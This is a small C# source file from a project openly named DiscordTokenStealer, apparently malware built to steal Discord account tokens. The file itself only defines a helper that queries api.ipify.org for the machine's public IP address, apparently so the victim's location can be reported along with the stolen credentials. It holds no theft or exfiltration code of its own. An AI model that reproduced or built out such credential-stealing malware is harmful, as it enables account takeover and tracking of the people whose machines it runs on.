using System.Net;

namespace DiscordTokenStealer;

public static class IpInfo
{
    public static async Task<IPAddress> GetIPAddress()
    {
        using var client = new HttpClient(new HttpClientHandler(), true);
        using var response = await client.GetAsync(new Uri("https://api.ipify.org"));
        return IPAddress.Parse(await response.Content.ReadAsStringAsync());
    }
}